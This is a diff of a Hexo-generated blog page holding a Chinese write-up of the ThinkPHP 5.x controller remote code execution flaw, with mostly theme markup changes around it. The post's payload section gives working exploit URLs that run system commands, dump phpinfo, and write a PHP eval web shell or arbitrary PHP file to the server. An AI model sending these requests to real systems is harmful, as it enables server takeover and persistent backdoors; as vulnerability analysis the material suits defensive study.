@@ -201,6 +201,26 @@
         </li>
       
         
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
@@ -333,7 +353,7 @@
 
       
         <h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>此次漏洞的成因是因为在没有开启强制路由的情况下控制器没过滤所引起的远程代码执行漏洞。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞影响版本为：</span><br><span class="line"></span><br><span class="line">ThinkPHP 5.0.5-5.0.22</span><br><span class="line">ThinkPHP 5.1.0-5.1.30</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞影响版本为：</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ThinkPHP</span> 5<span class="selector-class">.0</span><span class="selector-class">.5-5</span><span class="selector-class">.0</span><span class="selector-class">.22</span></span><br><span class="line"><span class="selector-tag">ThinkPHP</span> 5<span class="selector-class">.1</span><span class="selector-class">.0-5</span><span class="selector-class">.1</span><span class="selector-class">.30</span></span><br></pre></td></tr></table></figure>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先看一下官方commit<br><img src="https://i.loli.net/2019/01/20/5c4491670435d.png" alt><br>从补丁可以看出，漏洞产生的原因就是对于$controller没做过滤。</p>
 <p>下面以thinkphp 5.1.29为例进行分析</p>
 <p>先从补丁处向下追踪<br><img src="https://i.loli.net/2019/01/20/5c4492f4354c7.png" alt></p>
@@ -343,7 +363,7 @@
 <p>此时我们再从补丁处向上分析，查看controller从哪里来的。<br><img src="https://i.loli.net/2019/01/20/5c4499ffddd4d.png" alt></p>
 <p>这里<strong>$this-&gt;dispath</strong>最终调用的时Request类的path()方法解析路由信息。<br><img src="https://i.loli.net/2019/01/21/5c449ba5470ad.png" alt><br>这里pathinfo获取的时var_pathinfo,即我们可以GET方式传入参数<strong>index.php?s=index/\namespace\class/method</strong>,这里具体不细说，可以动态调试函数调用栈查看其具体过程。<br><img src="https://i.loli.net/2019/01/21/5c449b85173e9.png" alt></p>
 <p>到此为止，我们能够控制补丁处的controller，而从调用任何类的方法，此处只需要找到可以利用的类和方法即可</p>
-<h2 id="0x02-playload"><a href="#0x02-playload" class="headerlink" title="0x02 playload"></a>0x02 playload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.利用system函数远程命令执行 </span><br><span class="line"></span><br><span class="line">http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">其中5.0.5版本 ?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami去掉think前面的\即可</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.通过phpinfo函数写出phpinfo()的信息</span><br><span class="line"></span><br><span class="line">http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.写入shell:</span><br><span class="line"></span><br><span class="line">http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">http://localhost:9096/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php echo &apos;ok&apos;;?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-playload"><a href="#0x02-playload" class="headerlink" title="0x02 playload"></a>0x02 playload</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.利用system函数远程命令执行 </span><br><span class="line"></span><br><span class="line">http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=whoami</span><br><span class="line"></span><br><span class="line">其中5.0.5版本 ?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=whoami去掉think前面的\即可</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.通过phpinfo函数写出phpinfo()的信息</span><br><span class="line"></span><br><span class="line">http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.写入shell:</span><br><span class="line"></span><br><span class="line">http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func<span class="emphasis">_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_</span>GET[%22code%22])?^%3E%3Eshell.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">http://localhost:9096/index.php?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func<span class="emphasis">_array&amp;vars[0]=file_</span>put_contents&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=../test.php&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=<span class="xml"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'ok'</span>;<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -360,9 +380,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
           
-            <a href="/tags/thinkphp/" rel="tag"># thinkphp</a>
+            <a href="/tags/thinkphp/" rel="tag"><i class="fa fa-tag"></i> thinkphp</a>
           
         </div>
       
@@ -464,7 +484,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -474,10 +494,10 @@
               
               
               <div class="site-state-item site-state-categories">
-                
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
-                
+                </a>
               </div>
             
 
@@ -485,10 +505,10 @@
               
               
               <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">13</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -539,7 +559,8 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -549,6 +570,11 @@
 </div>
 
 
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
   <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
